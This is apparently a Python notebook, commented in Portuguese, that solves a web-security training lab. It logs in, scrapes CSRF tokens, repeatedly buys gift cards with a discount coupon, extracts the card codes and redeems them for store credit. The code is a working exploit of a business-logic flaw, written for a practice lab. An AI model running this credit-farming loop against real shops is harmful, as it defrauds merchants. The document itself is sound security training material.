# Log-in

```python
import requests

BASE_URL = "https://0ac9004d037e049580755df0003e006a.web-security-academy.net"
USERNAME = "wiener"
PASSWORD = "peter"

session = requests.Session()

response = session.post(
    f"{BASE_URL}/login",
    data={"username": USERNAME, "password": PASSWORD},
)
response.status_code, response.text
```

```python
from bs4 import BeautifulSoup

soup = BeautifulSoup(response.text, "html.parser")
print(soup.prettify())
```

```python
import re

match = re.search(r'name="csrf" value="([^"]+)"', response.text)
match.group(1)
```

```python
def get_csrf(url):
    """Extrai CSRF token de uma página."""
    r = session.get(url)
    match = re.search(r'name="csrf" value="([^"]+)"', r.text)
    assert match, f"CSRF não encontrado em {url}"
    return match.group(1)
```

```python
response = session.post(
    f"{BASE_URL}/login",
    data={"username": USERNAME, "password": PASSWORD, "csrf": get_csrf(f"{BASE_URL}/login")},
)
response.status_code, response.text
```

# Compra gift cards

Adiciona ao carrinho

```python
csrf = get_csrf(f"{BASE_URL}/my-account")
response = session.post(
    f"{BASE_URL}/cart",
    data={
        "csrf": csrf,
        "productId": "2",
        "redir": "PRODUCT",
        "quantity": "5"
    },
)
response.status_code
```

Aplica cupom

```python
csrf = get_csrf(f"{BASE_URL}/cart")
session.post(f"{BASE_URL}/cart/coupon", data={"csrf": csrf, "coupon": "SIGNUP30"})
response.status_code
```

Finaliza compra e pega códigos dos gift cards

```python
csrf = get_csrf(f"{BASE_URL}/cart")
response = session.post(f"{BASE_URL}/cart/checkout", data={"csrf": csrf})
response.status_code
```

```python
soup = BeautifulSoup(response.text, "html.parser")
print(soup.prettify())
```

```python
gift_card_codes = []
for table in soup.find_all("table"):
    header = table.find("th")
    if header.get_text(strip=True) == "Code":
        for row in table.find_all("td"):
            if not row:
                continue
            gift_card_code = row.get_text(strip=True)
            print(gift_card_code)
            gift_card_codes.append(gift_card_code)
```

Resgata gift cards

```python
csrf = get_csrf(f"{BASE_URL}/my-account")
response = session.post(
    f"{BASE_URL}/gift-card", data={"csrf": csrf, "gift-card": gift_card_codes[0]}
)
response.status_code
```
